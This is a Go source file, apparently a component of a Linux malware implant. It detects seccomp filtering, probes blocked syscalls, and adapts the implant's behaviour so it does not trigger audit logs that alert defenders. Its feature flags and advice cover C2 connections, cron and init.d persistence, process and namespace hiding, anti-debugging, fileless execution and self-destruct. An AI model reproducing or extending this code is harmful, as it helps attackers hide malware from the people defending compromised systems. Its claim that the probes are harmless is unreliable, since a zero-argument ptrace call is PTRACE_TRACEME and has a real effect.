package stealth

import (
	"fmt"
	"os"
	"strings"
	"syscall"
)

// Seccomp Awareness
//
// OPSEC rationale: If a seccomp filter is active, calling a blocked syscall
// generates a kernel log entry (audit message) that alerts defenders.
// We need to detect which syscalls are filtered and avoid calling them.
// This prevents the implant from triggering seccomp violations that
// would appear in dmesg/journalctl.

// SeccompStatus represents the seccomp mode for our process.
type SeccompStatus int

const (
	SeccompDisabled SeccompStatus = 0
	SeccompStrict   SeccompStatus = 1
	SeccompFilter   SeccompStatus = 2
)

// SeccompInfo holds detected seccomp state.
type SeccompInfo struct {
	Mode            SeccompStatus
	FilterCount     int      // number of loaded BPF filters
	CanExecve       bool     // can we call execve?
	CanSocket       bool     // can we create sockets?
	CanPtrace       bool     // can we ptrace?
	CanMount        bool     // can we mount?
	CanUnshare      bool     // can we create namespaces?
	Recommendations []string // behavioral recommendations
}

// DetectSeccomp reads /proc/self/status to determine seccomp mode.
func DetectSeccomp() *SeccompInfo {
	info := &SeccompInfo{
		Mode:       SeccompDisabled,
		CanExecve:  true,
		CanSocket:  true,
		CanPtrace:  true,
		CanMount:   true,
		CanUnshare: true,
	}

	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return info
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "Seccomp:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				switch fields[1] {
				case "0":
					info.Mode = SeccompDisabled
				case "1":
					info.Mode = SeccompStrict
				case "2":
					info.Mode = SeccompFilter
				}
			}
		}
		if strings.HasPrefix(line, "Seccomp_filters:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				fmt.Sscanf(fields[1], "%d", &info.FilterCount)
			}
		}
	}

	if info.Mode == SeccompFilter {
		// Probe which syscalls are available
		info.CanExecve = probeSyscall(syscall.SYS_EXECVE)
		info.CanSocket = probeSyscall(syscall.SYS_SOCKET)
		info.CanPtrace = probeSyscall(syscall.SYS_PTRACE)
		info.CanMount = probeSyscall(syscall.SYS_MOUNT)
		info.CanUnshare = probeSyscall(syscall.SYS_UNSHARE)
		info.Recommendations = buildSeccompRecommendations(info)
	}

	if info.Mode == SeccompStrict {
		// Strict mode only allows read, write, exit, sigreturn
		info.CanExecve = false
		info.CanSocket = false
		info.CanPtrace = false
		info.CanMount = false
		info.CanUnshare = false
		info.Recommendations = []string{
			"strict_mode: extremely limited — only read/write/exit available",
			"abort: consider self-destruct — cannot operate under strict seccomp",
		}
	}

	return info
}

// probeSyscall tests if a syscall is allowed by the seccomp filter.
// We call it with invalid args so it fails with EINVAL/EFAULT (allowed)
// rather than being killed by seccomp (blocked).
//
// OPSEC: This probing must be done carefully. If the seccomp action is
// SECCOMP_RET_KILL_PROCESS, probing will kill us. We check the action
// first if possible.
func probeSyscall(sysno uintptr) bool {
	// Use invalid arguments that will fail with EINVAL/EFAULT/ENOSYS
	// but won't trigger dangerous behavior if the syscall IS allowed
	_, _, errno := syscall.RawSyscall(sysno, 0, 0, 0)

	// If we got here, the syscall was allowed (even though it failed with bad args)
	// EPERM from seccomp filter returns EPERM, while EINVAL/EFAULT means the
	// syscall reached the kernel
	return errno != syscall.EPERM
}

// buildSeccompRecommendations generates behavioral advice based on detected filters.
func buildSeccompRecommendations(info *SeccompInfo) []string {
	var recs []string

	if !info.CanExecve {
		recs = append(recs, "no_execve: use memfd_create + write + fexecve instead of execve")
		recs = append(recs, "no_execve: avoid os/exec.Command — use raw syscalls")
	}

	if !info.CanSocket {
		recs = append(recs, "no_socket: cannot create new sockets — must reuse existing fds")
		recs = append(recs, "no_socket: consider socket inheritance from parent process")
	}

	if !info.CanPtrace {
		recs = append(recs, "no_ptrace: disable anti-debug ptrace checks — they'll trigger seccomp")
		recs = append(recs, "no_ptrace: disable syscall proxying — requires ptrace")
	}

	if !info.CanMount {
		recs = append(recs, "no_mount: cannot create private mounts — use existing filesystems")
		recs = append(recs, "no_mount: proc hiding via bind mounts unavailable")
	}

	if !info.CanUnshare {
		recs = append(recs, "no_unshare: cannot create namespaces — must operate in current ns")
		recs = append(recs, "no_unshare: this is a significant limitation for namespace-based hiding")
	}

	return recs
}

// ShouldAvoidSyscall checks if a specific syscall should be avoided.
func ShouldAvoidSyscall(info *SeccompInfo, syscallName string) bool {
	if info.Mode == SeccompDisabled {
		return false
	}

	switch syscallName {
	case "execve":
		return !info.CanExecve
	case "socket":
		return !info.CanSocket
	case "ptrace":
		return !info.CanPtrace
	case "mount":
		return !info.CanMount
	case "unshare", "clone":
		return !info.CanUnshare
	}

	return false
}

// AdaptToSeccomp adjusts implant behavior based on seccomp restrictions.
// Returns a map of feature flags that should be disabled.
func AdaptToSeccomp(info *SeccompInfo) map[string]bool {
	disabled := make(map[string]bool)

	if info.Mode == SeccompDisabled {
		return disabled
	}

	if !info.CanExecve {
		disabled["shell_exec"] = true
		disabled["persistence_cron"] = true
		disabled["persistence_initd"] = true
	}

	if !info.CanSocket {
		disabled["c2_new_connections"] = true
		disabled["network_blend"] = true
		disabled["dns_noise"] = true
	}

	if !info.CanPtrace {
		disabled["anti_debug"] = true
		disabled["syscall_proxy"] = true
		disabled["debugger_detect"] = true
	}

	if !info.CanMount {
		disabled["proc_hiding"] = true
		disabled["ns_hiding"] = true
		disabled["lsof_spoof"] = true
		disabled["fd_spoof"] = true
	}

	if !info.CanUnshare {
		disabled["namespace_creation"] = true
		disabled["nested_ns"] = true
	}

	return disabled
}
